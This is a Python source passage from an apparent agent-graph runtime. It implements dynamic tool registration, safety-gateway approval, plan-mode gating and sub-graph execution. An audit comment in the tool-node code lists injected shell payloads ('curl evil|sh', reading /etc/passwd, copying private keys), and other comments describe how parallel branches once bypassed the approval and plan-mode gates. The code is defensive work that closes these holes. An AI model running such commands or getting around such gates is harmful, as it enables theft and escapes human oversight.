                            },
                            "description": {
                                "type": "string",
                                "description": "What this tool does",
                            },
                            "parameters": {
                                "type": "object",
                                "description": "OpenAI-style parameter definitions",
                            },
                        },
                        "required": ["name"],
                    },
                },
            },
            {
                "type": "function",
                "function": {
                    "name": "unregister_tool",
                    "description": "Remove a tool from the registry. It will no longer be available for subsequent steps.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "name": {
                                "type": "string",
                                "description": "Name of the tool to remove",
                            },
                        },
                        "required": ["name"],
                    },
                },
            },
        ]

    _SAFE_TOOL_NAME_RE = __import__("re").compile(r"^[a-zA-Z_][a-zA-Z0-9_]{0,63}$")

    def _dynamic_register_tool(self, args: dict) -> str:
        if not self.tools:
            return "Error: No tool registry available"
        tool_name = args.get("name", "")
        tool_type = args.get("type", "terminal")
        tool_description = args.get("description", "")
        tool_params = args.get("parameters", {})

        if not tool_name:
            return "Error: 'name' parameter required for register_tool"

        if not self._SAFE_TOOL_NAME_RE.match(tool_name):
            return f"Error: invalid tool name '{tool_name}' — must match [a-zA-Z_][a-zA-Z0-9_]*"

        if self.tools.has(tool_name):
            return f"Tool '{tool_name}' already registered"

        from types import new_class

        from tools.base import BaseTool

        param_dict = {}
        if isinstance(tool_params, dict):
            for pk, pv in tool_params.items():
                if isinstance(pv, dict):
                    param_dict[pk] = pv
                elif isinstance(pv, str):
                    param_dict[pk] = {"type": "string", "description": pv}

        safe_name = f"Dynamic_{self._SAFE_TOOL_NAME_RE.match(tool_name).group()}"
        dyn_cls = new_class(safe_name, (BaseTool,), {})
        dyn_cls.name = tool_name
        dyn_cls.description = tool_description or f"Dynamic tool: {tool_name}"
        dyn_cls.parameters = param_dict

        async def _dyn_execute(self_inner, **kwargs) -> str:
            cmd = kwargs.get("command", kwargs.get("url", kwargs.get("query", "")))
            if cmd:
                import asyncio
                import shlex

                try:
                    split_args = shlex.split(str(cmd))
                except ValueError:
                    return f"Error: invalid command: {cmd[:100]}"
                if not split_args:
                    return "Error: empty command"
                proc = await asyncio.create_subprocess_exec(
                    split_args[0],
                    *split_args[1:],
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
                output = stdout.decode("utf-8", errors="replace")
                if stderr:
                    output += f"\n[STDERR] {stderr.decode('utf-8', errors='replace')}"
                return output.strip() or "Done"
            return "No command provided"

        dyn_cls.execute = _dyn_execute
        new_tool = dyn_cls()

        self.tools.register(new_tool)
        logger.info("Dynamic tool registered: %s (type=%s)", tool_name, tool_type)
        return f"Tool '{tool_name}' registered successfully"

    def _dynamic_unregister_tool(self, args: dict) -> str:
        if not self.tools:
            return "Error: No tool registry available"
        tool_name = args.get("name", "")
        if not tool_name:
            return "Error: 'name' parameter required for unregister_tool"
        if not self.tools.has(tool_name):
            return f"Tool '{tool_name}' not found"
        self.tools.unregister(tool_name)
        logger.info("Dynamic tool unregistered: %s", tool_name)
        return f"Tool '{tool_name}' unregistered successfully"

    def _register_exec_future(self, exec_id: str, key: str) -> None:
        # 审计 A-1 Tier1: future 创建时登记归属 exec_id, 供 reap 索引.
        self._exec_future_keys.setdefault(exec_id, set()).add(key)

    def _reap_exec_futures(self, exec_id: str) -> None:
        # 审计 A-1 Tier1: exec 结束/异常时清本 exec 残留 future (timeout 路径
        # 异常 skip pop 的兜底). 仅清本 exec 注册的 key, 不动并发别 exec.
        keys = self._exec_future_keys.pop(exec_id, None)
        if not keys:
            return
        reaped = 0
        for key in keys:
            for registry in (self._safety_futures, self._plan_futures):
                fut = registry.pop(key, None)
                if fut is not None and not fut.done():
                    fut.cancel()
                    reaped += 1
        if reaped:
            logger.warning(
                "A-1 reaped %d stranded futures for exec_id=%s", reaped, exec_id
            )

    def _seed_ctx_variables(self, ctx: AgentContext) -> None:
        # 审计 A-1/A-2 Tier3: ctx.variables 播种. dispatch 入口 + 直接调用
        # 节点 handler (测试/并行分支) 共用. None 时从 runtime seed
        # (self.variables) 快照 copy — 隔离不共享. 已播种 (None check) 跳过.
        if ctx.variables is None:
            ctx.variables = VariableManager()
            ctx.variables.load_from(self.variables.to_dict())

    def approve_action(self, action_id: str) -> bool:
        if self.safety_gateway:
            ok = self.safety_gateway.approve_action(action_id)
            if ok and action_id in self._safety_futures:
                fut = self._safety_futures.pop(action_id, None)
                if fut and not fut.done():
                    fut.set_result(True)
            logger.info("Runtime approve_action: action_id=%s ok=%s", action_id, ok)
            return ok
        if action_id in self._safety_futures:
            fut = self._safety_futures.pop(action_id, None)
            if fut and not fut.done():
                fut.set_result(True)
            return True
        return False

    def reject_action(self, action_id: str) -> bool:
        if self.safety_gateway:
            ok = self.safety_gateway.reject_action(action_id)
            if ok and action_id in self._safety_futures:
                fut = self._safety_futures.pop(action_id, None)
                if fut and not fut.done():
                    fut.set_result(False)
            logger.info("Runtime reject_action: action_id=%s ok=%s", action_id, ok)
            return ok
        if action_id in self._safety_futures:
            fut = self._safety_futures.pop(action_id, None)
            if fut and not fut.done():
                fut.set_result(False)
            return True
        return False

    def approve_plan_in_graph(self, plan_id: str) -> bool:
        # C6: resolve the in-graph planner approval future for plan_id.
        fut = self._plan_futures.pop(plan_id, None)
        if fut and not fut.done():
            fut.set_result(True)
            logger.info("approve_plan_in_graph: plan_id=%s approved", plan_id)
            return True
        logger.warning("approve_plan_in_graph: no pending future plan_id=%s", plan_id)
        return False

    def reject_plan_in_graph(self, plan_id: str) -> bool:
        # C6: reject the in-graph planner approval future for plan_id.
        fut = self._plan_futures.pop(plan_id, None)
        if fut and not fut.done():
            fut.set_result(False)
            logger.info("reject_plan_in_graph: plan_id=%s rejected", plan_id)
            return True
        logger.warning("reject_plan_in_graph: no pending future plan_id=%s", plan_id)
        return False

    async def _await_safety_approval(
        self, ctx: AgentContext, safety_result, category: str, node_label: str
    ) -> AsyncIterator[AgentEvent] | None:
        if not safety_result.requires_approval:
            yield AgentEvent(
                type=AgentEventType.SAFETY_APPROVAL,
                content=safety_result.reason or "approved",
                metadata={"action": "approved", "category": category},
                node_id=node_label,
            )
            return

        action_id = safety_result.metadata.get("action_id", "")
        if not action_id:
            action_id = str(__import__("uuid").uuid4())
            safety_result.metadata["action_id"] = action_id

        loop = asyncio.get_running_loop()
        future: asyncio.Future[bool] = loop.create_future()
        self._safety_futures[action_id] = future
        # 审计 A-1 Tier1: 登记归属 exec, 异常路径 reap 兜底.
        self._register_exec_future(ctx.session_id, action_id)

        if self.safety_gateway:
            with self.safety_gateway._lock:
                self.safety_gateway._pending_action_approvals.setdefault(
                    action_id,
                    {
                        "category": category,
                        "content": safety_result.reason,
                        "level": safety_result.metadata.get("level", "L2"),
                        "status": "pending",
                    },
                )
            self.safety_gateway._pending_approvals[action_id] = future

        yield AgentEvent(
            type=AgentEventType.SAFETY_APPROVAL,
            content=safety_result.reason,
            metadata={
                "action": "pending_approval",
                "category": category,
                "action_id": action_id,
                "level": safety_result.metadata.get("level", ""),
                "diff_preview": safety_result.diff_preview.to_dict()
                if safety_result.diff_preview
                else None,
            },
            node_id=node_label,
        )

        try:
            approved = await asyncio.wait_for(future, timeout=self._safety_timeout)
        except asyncio.TimeoutError:
            self._safety_futures.pop(action_id, None)
            logger.warning("Safety approval timed out: action_id=%s", action_id)
            yield AgentEvent(
                type=AgentEventType.SAFETY_TIMEOUT,
                content=f"Safety approval timed out for {category}",
                metadata={"action_id": action_id, "category": category},
                node_id=node_label,
            )
            ctx.error = f"SafetyGateway: approval timed out for {category}"
            yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
            return

        self._safety_futures.pop(action_id, None)

        if not approved:
            ctx.error = f"SafetyGateway: {category} rejected — {safety_result.reason}"
            yield AgentEvent(
                type=AgentEventType.SAFETY_APPROVAL,
                content=safety_result.reason,
                metadata={
                    "action": "rejected",
                    "category": category,
                    "action_id": action_id,
                },
                node_id=node_label,
            )
            yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
            return

        yield AgentEvent(
            type=AgentEventType.SAFETY_APPROVAL,
            content=safety_result.reason or "approved",
            metadata={
                "action": "approved",
                "category": category,
                "action_id": action_id,
            },
            node_id=node_label,
        )

    async def _execute_tool_node(
        self, ctx: AgentContext, node: NodeConfig, graph: AgentGraph
    ) -> AsyncIterator[AgentEvent]:
        """Execute a standalone tool node."""
        if node.tool_name == "__sub_graph__":
            async for event in self._execute_sub_graph(ctx, node.tool_params, node):
                yield event
            return

        # 防御: 直接调用 (测试/error_handler 委托) ctx.variables 未被 dispatch 播种.
        self._seed_ctx_variables(ctx)
        params = {}
        # 审计 E-4/P0-4: 插值 → 终端命令注入. `{{user_input}}` 直连 terminal
        # `command` 时, 攻击者控制的图输入成 shell 命令 (curl evil|sh / cat
        # /etc/passwd / scp 私钥), 绕灾难黑名单. 此处 fail-closed: terminal
        # command 含变量插值一律挡, 需 FUSION_TERMINAL_ALLOW_INTERP=1 显式 opt-in
        # (受控 CI). 转义 (shlex.quote) 仍漏多命令语义注入, 故硬挡更安全.
        if node.tool_name == "terminal":
            _allow_interp = os.environ.get(
                "FUSION_TERMINAL_ALLOW_INTERP", ""
            ).strip().lower() in ("1", "true", "yes")
            _cmd_template = node.tool_params.get("command", "")
            if isinstance(_cmd_template, str) and "{{" in _cmd_template and not _allow_interp:
                ctx.error = (
                    "Blocked: terminal 'command' contains variable interpolation "
                    "({{...}}); passing user-controlled input to a shell is an RCE "
                    "vector. Use a non-shell tool, or set FUSION_TERMINAL_ALLOW_INTERP=1 "
                    "for controlled environments."
                )
                logger.warning(
                    "E-4 blocked terminal command interpolation node=%s", node.label
                )
                yield AgentEvent(
                    type=AgentEventType.ERROR,
                    content=ctx.error,
                    node_id=node.label,
                    metadata={"e4_blocked": True},
                )
                return
        for k, v in node.tool_params.items():
            if isinstance(v, str):
                params[k] = ctx.variables.interpolate(v)
            else:
                params[k] = v

        # C6 plan-as-mode: gate write tools on the standalone tool-node path.
        if (
            ctx.plan_mode
            and node.tool_name not in self._plan_readonly_tools
            and node.tool_name != "exit_plan_mode"
        ):
            ctx.error = (
                f"Blocked: plan_mode active, tool '{node.tool_name}' writes state. "
                f"Call exit_plan_mode to transition to execution."
            )
            logger.info(
                "plan_mode blocked tool-node tool=%s node=%s",
                node.tool_name,
                node.label,
            )
            yield AgentEvent(
                type=AgentEventType.ERROR,
                content=ctx.error,
                node_id=node.label,
                metadata={"plan_mode_blocked": True},
            )
            return

        if self.safety_gateway:
            safety_result = self.safety_gateway.evaluate_action(
                category="tool_call",
                content=f"{node.tool_name}({params})",
                context=f"tool={node.tool_name} node={node.label}",
            )
            if safety_result.action.value == "block" and not safety_result.requires_approval:
                ctx.error = f"SafetyGateway blocked tool call: {safety_result.reason}"
                yield AgentEvent(
                    type=AgentEventType.SAFETY_APPROVAL,
                    content=safety_result.reason,
                    metadata={"action": "blocked", "category": "tool_call"},
                )
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                return
            if safety_result.requires_approval:
                async for evt in self._await_safety_approval(
                    ctx, safety_result, "tool_call", node.label
                ):
                    yield evt
                    if evt.type == AgentEventType.ERROR:
                        return
            else:
                yield AgentEvent(
                    type=AgentEventType.SAFETY_APPROVAL,
                    content=safety_result.reason or "approved",
                    metadata={"action": "approved", "category": "tool_call"},
                )

        try:
            tool = self.tools.get(node.tool_name)
            params = self._merge_tool_config_defaults(node.tool_name, params)
            result = await tool.execute(**params)
        except KeyError:
            result = f"Error: Tool '{node.tool_name}' not found"
        except Exception as e:
            result = f"Error: {e}"

        ctx.add_message("tool", str(result), tool_call_id=f"tool_{node.tool_name}")
        ctx.messages[-1]["_node_id"] = node.label

        yield AgentEvent(
            type=AgentEventType.TOOL_RESULT,
            content=str(result),
            name=node.tool_name,
            node_id=node.label,
        )

        # #202: direct tool node error detection. Matches the LLM-driven tool
        # path's "Error:" prefix convention (line ~1461) AND the common tool
        # pattern of returning json.dumps({"error": ...}). When the graph opts
        # in via stop_on_tool_error, a tool error stops the cascade: set
        # ctx.error, emit a tagged ERROR event, and return BEFORE applying
        # output_mapping — so a downstream gate can't misread a stray value
        # (e.g. missing key -> None -> "false" -> wrong branch). Default off
        # keeps existing error-as-result behavior for graphs that handle it.
        is_tool_error = False
        error_detail = ""
        if isinstance(result, str):
            if result.startswith("Error:"):
                is_tool_error = True
                error_detail = result
            else:
                stripped = result.strip()
                if stripped.startswith("{"):
                    try:
                        parsed = json.loads(stripped)
                        if isinstance(parsed, dict) and "error" in parsed:
                            is_tool_error = True
                            error_detail = json.dumps(
                                parsed, ensure_ascii=False
                            )
                    except (ValueError, TypeError):
                        pass
        if is_tool_error and getattr(graph, "stop_on_tool_error", False):
            ctx.error = f"Tool '{node.tool_name}' (node '{node.label}') failed: {error_detail}"
            logger.warning(
                "tool node error stops cascade (stop_on_tool_error=True) "
                "tool=%s node=%s error=%s",
                node.tool_name,
                node.label,
                error_detail[:200],
            )
            yield AgentEvent(
                type=AgentEventType.ERROR,
                content=ctx.error,
                name=node.tool_name,
                node_id=node.label,
                metadata={
                    "tool_error": True,
                    "tool": node.tool_name,
                    "node": node.label,
                },
            )
            return

        output_mapping = node.tool_params.get("output_mapping", {})
        if output_mapping:
            self._apply_tool_output_mapping(output_mapping, result, node.label, ctx)

    def _apply_tool_output_mapping(
        self, output_mapping: dict, result: Any, node_label: str, ctx: AgentContext
    ) -> None:
        """把工具返回值按 output_mapping 写入变量，供下游节点 {{ var }} 引用。

        约定 {source_key: target_var}，与 sub_graph output_mapping 一致：
        - source_key 为 "" 或 "result"：整值写入 target_var
        - 否则：尝试 json.loads(result) 按 source_key 取值；解析失败回退整值并记 warning
        """
        parsed = None
        for source_key, target_var in output_mapping.items():
            if not target_var:
                continue
            if source_key in ("", "result"):
                ctx.variables.set(target_var, result)
                continue
            if parsed is None and isinstance(result, str):
                try:
                    parsed = json.loads(result)
                except (ValueError, TypeError):
                    logger.warning(
                        "output_mapping: node=%s result 非 JSON，回退整值写入 %s",
                        node_label,
                        target_var,
                    )
            if isinstance(parsed, dict) and source_key in parsed:
                ctx.variables.set(target_var, parsed[source_key])
            else:
                ctx.variables.set(target_var, result)

    def _execute_condition_node(self, ctx: AgentContext, node: NodeConfig) -> AgentEvent:
        """Evaluate a condition node using the condition engine."""
        expr = ctx.variables.interpolate(node.condition_expr)
        try:
            result = self.condition_engine.evaluate(expr, ctx, ctx.variables)
        except Exception as e:
            logger.warning("Condition evaluation failed: %s -> %s", expr, e)
            result = "false"

        return AgentEvent(
            type=AgentEventType.THINK,
            content=result,
            node_id=node.label,
            metadata={"condition": node.condition_expr, "result": result},
        )

    def _execute_loop_node(
        self, ctx: AgentContext, node: NodeConfig, graph: AgentGraph
    ) -> AgentEvent:
        """Execute a loop node — check if loop should continue."""
        # 防御: 直接调用 (测试/并行分支) ctx.variables 未被 dispatch 播种.
        self._seed_ctx_variables(ctx)
        max_iter = node.max_iterations
        loop_var = node.tool_params.get("loop_var", "loop_count")
        current = ctx.variables.get(loop_var, 0)
        try:
            current = int(current)
        except (ValueError, TypeError):
            current = ctx.iteration_count

        if current < max_iter:
            ctx.variables.set(loop_var, current + 1)
            action = "loop_continue"
        else:
            action = "loop_exit"

        return AgentEvent(
            type=AgentEventType.THINK,
            content=action,
            node_id=node.label,
            metadata={"max_iterations": max_iter, "current": current, "action": action},
        )

    async def _execute_error_handler_node(
        self, ctx: AgentContext, node: NodeConfig, graph: AgentGraph
    ) -> AsyncIterator[AgentEvent]:
        """Execute an error handler — re-execute the failed node with retries."""
        max_retries = node.max_retries
        retry_delay = node.retry_delay

        failed_node_id = ""
        for msg in reversed(ctx.messages):
            if isinstance(msg, dict) and msg.get("role") == "assistant":
                break
            if isinstance(msg, dict) and msg.get("role") == "tool":
                failed_node_id = msg.get("_node_id", "")
                if failed_node_id:
                    break
                tool_call_id = msg.get("tool_call_id", "")
                if tool_call_id.startswith("tool_"):
                    failed_node_id = tool_call_id[5:]
                    break

        if not failed_node_id:
            failed_node_id = ctx.current_node_id

        error_msg = ctx.error
        ctx.error = ""

        for attempt in range(1, max_retries + 1):
            yield AgentEvent(
                type=AgentEventType.THINK,
                content=f"Retry attempt {attempt}/{max_retries} for error: {error_msg}",
                node_id=node.label,
                metadata={
                    "attempt": attempt,
                    "max_retries": max_retries,
                    "error": error_msg,
                },
            )

            if attempt > 1:
                await asyncio.sleep(retry_delay)

            failed_node = graph.get_node(failed_node_id)
            if failed_node:
                if failed_node.type == "tool":
                    async for event in self._execute_tool_node(ctx, failed_node, graph):
                        yield event
                elif failed_node.type == "llm":
                    model = graph.find_llm_model()
                    tools_schema = self.tools.to_openai_schemas()
                    if any(n.allow_dynamic_tools for n in graph.nodes.values()):
                        tools_schema.extend(self._dynamic_tool_schemas())
                    async for event in self._execute_llm_node(
                        ctx, failed_node, graph, model, tools_schema, ""
                    ):
                        yield event

            if not ctx.error:
                break
            logger.warning("Retry %d/%d still has error: %s", attempt, max_retries, ctx.error)

        yield AgentEvent(
            type=AgentEventType.TOOL_RESULT,
            content=f"Error handler completed after {attempt} attempt(s)",
            node_id=node.label,
        )

    async def _execute_parallel_node(
        self,
        ctx: AgentContext,
        node: NodeConfig,
        graph: AgentGraph,
        current_node_id: str,
        stream: bool = False,
    ) -> AsyncIterator[AgentEvent]:
        # C5: parallel 图节点真 fan-out/gather。所有出边 = N 条并行分支,
        # 每分支独立 sub-runtime 跑从分支 target 起到汇聚点的子图,
        # asyncio.gather 并发, 结果按边序合并进父 ctx。
        yield AgentEvent(
            type=AgentEventType.START,
            content=f"Parallel fan-out from {current_node_id}",
            node_id=current_node_id,
        )

        outgoing = graph.get_outgoing_edges(current_node_id)
        if not outgoing:
            logger.warning("parallel node %s has no outgoing edges", current_node_id)
            yield AgentEvent(
                type=AgentEventType.RESULT,
                content="parallel: no branches",
                node_id=current_node_id,
                metadata={"next_id": ""},
            )
            return

        # plan_mode 激活: 只读探查, 不 fan-out 写副作用, 回退首边。
        if ctx.plan_mode:
            first_target = outgoing[0].target_id
            logger.info(
                "parallel node %s plan_mode active, fallback first edge -> %s",
                current_node_id,
                first_target,
            )
            yield AgentEvent(
                type=AgentEventType.RESULT,
                content=f"parallel: plan_mode sequential fallback to {first_target}",
                node_id=current_node_id,
                metadata={"next_id": first_target},
            )
            return

        # 单出边: 无 fan-out 必要, 直接走首边 (零行为变化)。
        if len(outgoing) == 1:
            only_target = outgoing[0].target_id
            yield AgentEvent(
                type=AgentEventType.RESULT,
                content=f"parallel: single branch to {only_target}",
                node_id=current_node_id,
                metadata={"next_id": only_target},
            )
            return

        # 找汇聚点 (fan-in target): 各分支 target 出发的可达节点集合的交集中,
        # 距离 parallel 节点最近的公共后继。若全分支共享同一后继即汇聚点;
        # 找不到则各分支跑到各自 end, 无显式汇聚。
        merge_node_id = self._find_merge_node(graph, outgoing)
        logger.info(
            "parallel node %s branches=%d merge=%s",
            current_node_id,
            len(outgoing),
            merge_node_id or "(none)",
        )

        branch_targets = [e.target_id for e in outgoing]

        async def run_branch(
            branch_idx: int, branch_target: str, edge_label: str
        ) -> tuple[int, str, list[AgentEvent], str]:
            # 构建分支子图: 从 branch_target 可达且不含 merge_node 的节点。
            sub_graph = self._build_branch_subgraph(
                graph, branch_target, merge_node_id, current_node_id
            )
            if sub_graph is None:
                return (
                    branch_idx,
                    edge_label,
                    [],
                    f"Error: branch {branch_idx} subgraph build failed",
                )

            sub_runtime = AgentRuntime(
                tool_registry=self.tools,
                max_iterations=self.max_iterations,
                variables=VariableManager(),
                llm_gateway=self.llm_gateway,
                safety_gateway=self.safety_gateway,
                store=self.store,
                memory_engine=self.memory_engine,
                telemetry_engine=self.telemetry_engine,
            )
            # 审计 D-3: sub-runtime 继承父 runtime 的 plan_mode, 否则
            # 父处于只读探索期时并行分支仍可调写工具绕过门禁.
            # 审计 A-1 Tier2: plan_mode per-exec, 经 sub_ctx 传入, 子 runtime
            # dispatch (context 提供) 继承, 不再写 sub_runtime 单例.
            sub_ctx = AgentContext()
            sub_ctx.plan_mode = ctx.plan_mode
            sub_ctx.metadata["parallel_branch"] = edge_label or f"branch_{branch_idx}"
            branch_events: list[AgentEvent] = []
            async for event in sub_runtime.execute_graph(sub_graph, "", sub_ctx):
                branch_events.append(event)

            # 提取分支最终输出 (最后一条 assistant content 或 THINK 事件)。
            branch_output = ""
            for ev in reversed(branch_events):
                if ev.type == AgentEventType.THINK and ev.content:
                    branch_output = ev.content
                    break
            if not branch_output:
                for msg in reversed(sub_ctx.messages):
                    if isinstance(msg, dict) and msg.get("role") == "assistant":
                        branch_output = msg.get("content", "")
                        break
            logger.info(
                "parallel branch %d (%s) done, output_len=%d events=%d",
                branch_idx,
                edge_label or f"branch_{branch_idx}",
                len(branch_output),
                len(branch_events),
            )
            return branch_idx, edge_label, branch_events, branch_output

        tasks = [
            run_branch(i, tgt, e.label) for i, (e, tgt) in enumerate(zip(outgoing, branch_targets))
        ]
        results = await asyncio.gather(*tasks)

        # 按边序 yield 各分支事件 (带 [parallel:label] 标签)。
        merged_outputs: list[str] = []
        for branch_idx, edge_label, branch_events, branch_output in sorted(
            results, key=lambda r: r[0]
        ):
            tag = edge_label or f"branch_{branch_idx}"
            for ev in branch_events:
                if ev.type in (AgentEventType.START, AgentEventType.END):
                    continue
                yield AgentEvent(
                    type=ev.type,
                    content=f"[parallel:{tag}] {ev.content}",
                    name=ev.name,
                    args=ev.args,
                    node_id=ev.node_id,
                    metadata=ev.metadata,
                )
            if branch_output:
                merged_outputs.append(f"[{tag}]\n{branch_output}")

        # 合并: 各分支输出拼接进父 ctx 作为 assistant message。
        if merged_outputs:
            merged_text = "\n\n".join(merged_outputs)
            ctx.add_message("assistant", merged_text)
            logger.info(
                "parallel node %s merged %d branches, merged_len=%d",
                current_node_id,
                len(merged_outputs),
                len(merged_text),
            )

        yield AgentEvent(
            type=AgentEventType.RESULT,
            content=f"Parallel fan-out complete: {len(results)} branches merged",
            node_id=current_node_id,
            metadata={"next_id": merge_node_id or ""},
        )

    def _find_merge_node(self, graph: AgentGraph, outgoing: list) -> str:
        # 找 fan-in 汇聚点: 各分支 target 可达集合 (不含自身) 的公共节点中,
        # 选所有分支都可达的那个。多候选时取分支0 可达序中首个公共点。
        if len(outgoing) < 2:
            return ""

        def reachable_from(start_id: str) -> tuple[set[str], list[str]]:
            # 返回 (可达集合, BFS 发现序列表) — 列表保证确定性遍历。
            visited: set[str] = set()
            order: list[str] = []
            queue = [start_id]
            while queue:
                cur = queue.pop(0)
                if cur in visited:
                    continue
                visited.add(cur)
                order.append(cur)
                for e in graph.get_outgoing_edges(cur):
                    queue.append(e.target_id)
            return visited, order

        branch_targets = [e.target_id for e in outgoing]
        reachable_sets = [reachable_from(t)[0] for t in branch_targets]
        # 公共可达 = 所有分支都能到达的节点。
        common = reachable_sets[0]
        for s in reachable_sets[1:]:
            common = common & s
        # 排除分支 target 自身 (汇聚点应在分支之后)。
        common = common - set(branch_targets)
        if not common:
            return ""
        # 取分支0 BFS 发现序中首个公共节点 (最近汇聚点, 确定性)。
        _, order = reachable_from(branch_targets[0])
        for nid in order:
            if nid in common:
                return nid
        return ""

    def _build_branch_subgraph(
        self,
        graph: AgentGraph,
        branch_target: str,
        merge_node_id: str,
        parallel_node_id: str,
    ) -> AgentGraph | None:
        # 构建分支子图: 从 branch_target 起可达、不含 merge_node / parallel_node
        # 的节点子集; start_node_id = branch_target; end 节点复用 graph 的 end
        # (若无 merge_node 则分支跑到原 end)。
        if branch_target not in graph.nodes:
            return None

        excluded = {merge_node_id, parallel_node_id} if merge_node_id else {parallel_node_id}

        # BFS 收集分支可达节点 (遇 merge_node 不越过)。
        branch_nodes: set[str] = set()
        queue = [branch_target]
        while queue:
            cur = queue.pop(0)
            if cur in branch_nodes or cur in excluded:
                continue
            branch_nodes.add(cur)
            for e in graph.get_outgoing_edges(cur):
                if e.target_id not in excluded:
                    queue.append(e.target_id)

        if not branch_nodes:
            return None

        sub = AgentGraph(
            name=f"{graph.name}:branch:{branch_target}",
            start_node_id=branch_target,
        )
        # 复制分支节点; 分支起点若原为 start 类型则保持, 否则不改类型。
        for nid in branch_nodes:
            sub.add_node(nid, graph.nodes[nid])
        # 复制分支内的边 (源+目标都在分支节点集, 且不指向 merge_node)。
        for e in graph.edges:
            if e.source_id in branch_nodes and e.target_id in branch_nodes:
                sub.add_edge(e.source_id, e.target_id, e.label)
        return sub

    async def _execute_sub_graph(
        self,
        ctx: AgentContext,
        params: dict,
        parent_node: NodeConfig,
    ) -> AsyncIterator[AgentEvent]:
        """Execute a sub-graph node."""
        graph_json = params.get("graph_json", "")
        input_mapping = params.get("input_mapping", {})
        output_mapping = params.get("output_mapping", {})

        # 审计 E-16/P0-4: 递归深度门. 超上限挡 (子图循环引用致栈溢出崩溃进程).
        max_depth = _max_sub_graph_depth()
        if self._sub_graph_depth >= max_depth:
            logger.warning(
                "E-16 sub-graph depth limit hit depth=%d max=%d node=%s",
                self._sub_graph_depth, max_depth, parent_node.label,
            )
            yield AgentEvent(
                type=AgentEventType.ERROR,
                content=(
                    f"Sub-graph recursion depth limit reached ({self._sub_graph_depth} >= "
                    f"{max_depth}). Possible circular sub-graph reference. "
                    f"Set FUSION_SUB_GRAPH_MAX_DEPTH higher if intentional."
                ),
                node_id=parent_node.label,
                metadata={"e16_depth": self._sub_graph_depth, "e16_max": max_depth},
            )
            return

        if not graph_json:
            yield AgentEvent(type=AgentEventType.ERROR, content="Sub-graph: no graph_json provided")
            return

        try:
            sub_graph = AgentGraph.from_json(graph_json)
        except Exception as e:
            yield AgentEvent(type=AgentEventType.ERROR, content=f"Sub-graph parse error: {e}")
            return

        # 审计 A-2/A-1 Tier3: 父变量读自 ctx.variables (per-exec 父空间),
        # 不碰 singleton self.variables. input_mapping 解析 → sub_input/sub_vars.
        # 防御: 直接调用 _execute_sub_graph (测试/并行分支) ctx.variables 可能
        # 未被 dispatch 播种 — 就地补 seed, 与 dispatch 同源.
        self._seed_ctx_variables(ctx)
        sub_input = ""
        for parent_var, sub_var in input_mapping.items():
            val = ctx.variables.get(parent_var, "")
            if sub_var == "input":
                sub_input = str(val)
            else:
                ctx.variables.set(sub_var, val)

        sub_vars = VariableManager()
        sub_vars.load_from(ctx.variables.to_dict())

        sub_runtime = AgentRuntime(
            tool_registry=self.tools,
            max_iterations=self.max_iterations,
            variables=sub_vars,
            llm_gateway=self.llm_gateway,
            safety_gateway=self.safety_gateway,
            store=self.store,
            memory_engine=self.memory_engine,
            telemetry_engine=self.telemetry_engine,
        )
        # 审计 D-3: sub-runtime 继承父 runtime 的 safety_gateway / store /
        # memory_engine / plan_mode, 否则子图执行完全脱离安全网 (无 L3
        # 内容检查 + 无只读探索门禁 + 无持久化/记忆), 父图授权的安全策略
        # 在子图里静默失效.
        # 审计 D-3: plan_mode 经 sub_ctx 继承 (per-exec), 不写 sub_runtime 单例.
        # 审计 A-1 Tier2: dispatch (context 提供) 继承 ctx.plan_mode.
        sub_ctx = AgentContext()
        sub_ctx.plan_mode = ctx.plan_mode
        # 审计 E-16: 子 runtime 继承父深度 +1, 递归计数贯穿整条子图链.
        sub_runtime._sub_graph_depth = self._sub_graph_depth + 1

        # Issue #175: lifecycle hook — sub-agent start.
        await self._fire_tool_hooks(
            "SUBAGENT_START",
            "",
            {"graph_id": sub_graph.id, "graph_name": sub_graph.name},
        )
        async for event in sub_runtime.execute_graph(sub_graph, sub_input, sub_ctx):
            yield AgentEvent(
                type=event.type,
                content=f"[sub:{sub_graph.name}] {event.content}",
                name=event.name,
                args=event.args,
                node_id=event.node_id,
                metadata=event.metadata,
            )

        # Issue #175: lifecycle hook — sub-agent stop.
        await self._fire_tool_hooks(
            "SUBAGENT_STOP",
            "",
            {"graph_id": sub_graph.id, "graph_name": sub_graph.name},
        )

        for sub_var, parent_var in output_mapping.items():
            val = sub_vars.get(sub_var, "")
            ctx.variables.set(parent_var, val)

    def _extract_template_name(self, text: str) -> str:
        """Check if text references a prompt template like {{ template:code-review }}."""
        match = re.match(r"^\{\{\s*template:(\w[\w-]*)\s*\}\}$", text.strip())
        if match:
            return match.group(1)
        return ""

    async def _execute_rag_node(
        self,
        ctx: AgentContext,
        node: NodeConfig,
        graph: AgentGraph,
        model: str,
        tools_schema: list[dict],
        system_prompt: str,
        stream: bool = False,
    ) -> AsyncIterator[AgentEvent]:
        """Execute a RAG node — retrieve context then generate via LLM."""
        try:
            from .rag_pipeline import RAGConfig, RAGPipeline
        except ImportError:
            yield AgentEvent(type=AgentEventType.ERROR, content="RAG pipeline not available")
            return

        query = ""
        for msg in reversed(ctx.messages):
            if isinstance(msg, dict) and msg.get("role") == "user":
                query = msg.get("content", "")
                break
        if not query:
            query = " ".join(
                m.get("content", "")
                for m in ctx.messages
                if isinstance(m, dict) and m.get("role") == "user"
            )[:500]

        rag_config_dict = node.tool_params.get("rag_config", {})
        rag_config = RAGConfig(
            **{
                k: v
                for k, v in rag_config_dict.items()
                if k
                in (
                    "top_k",
                    "similarity_threshold",
                    "rerank",
                    "mode",
                    "scope",
                    "max_context_tokens",
                )
            }
        )

        knowledge_engine = None
        if hasattr(self, "_knowledge_engine") and self._knowledge_engine:
            knowledge_engine = self._knowledge_engine

        pipeline = RAGPipeline(knowledge_engine=knowledge_engine, gateway=self.llm_gateway)

        try:
            rag_result = pipeline.retrieve(query, config=rag_config)
        except Exception as e:
            logger.warning("RAG retrieve failed: %s", e)
            rag_result = None

        if rag_result and rag_result.context_text:
            context_block = (
                f"\n\n[Retrieved Context]\n{rag_result.context_text}\n[/Retrieved Context]\n\n"
            )
            node_prompt = node.system_prompt or system_prompt or ""
            if node_prompt:
                node_prompt = ctx.variables.interpolate(node_prompt)
                node_prompt += context_block
            else:
                node_prompt = (
